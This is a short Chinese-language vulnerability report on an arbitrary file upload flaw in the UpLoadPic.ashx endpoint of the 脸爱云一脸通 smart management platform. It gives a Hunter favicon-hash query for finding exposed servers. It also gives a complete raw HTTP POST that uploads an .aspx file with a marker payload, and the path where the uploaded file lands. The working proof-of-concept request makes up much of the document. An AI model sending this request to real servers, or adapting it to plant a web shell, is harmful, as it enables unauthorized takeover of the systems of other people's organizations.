# 脸爱云一脸通智慧管理平台UpLoadPic存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台UpLoadPic存在任意文件上传漏洞。攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 脸爱云一脸通智慧管理平台

# 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征

![1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28.png](./img/TMb0E4UMwzE5Sufh/1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28-957942.png)

# 四、漏洞复现
```java
POST /UpLoadPic.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Length: 431
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1eBdibB13u
X-Requested-With: XMLHttpRequest

------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="action"

post
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="myPhoto"; filename="1.aspx"
Content-Type: image/png

<% response.write("FC5E038D38A57032085441E7FE7010B0") %>
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="oldName"


------WebKitFormBoundarywt7cEu1eBdibB13u--
```

![1714288574828-15ec00c1-67e4-41b6-99c0-178e1a014b21.png](./img/TMb0E4UMwzE5Sufh/1714288574828-15ec00c1-67e4-41b6-99c0-178e1a014b21-479202.png)

文件上传位置

```java
/images/48884063e99e45ba9fc0fa7e138261021.aspx
```

![1714288605618-a32595ec-d02e-42eb-86d1-11b3e54dd707.png](./img/TMb0E4UMwzE5Sufh/1714288605618-a32595ec-d02e-42eb-86d1-11b3e54dd707-583654.png)



> 更新: 2024-04-28 15:34:50  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pq3pt0qifwh7x5wo>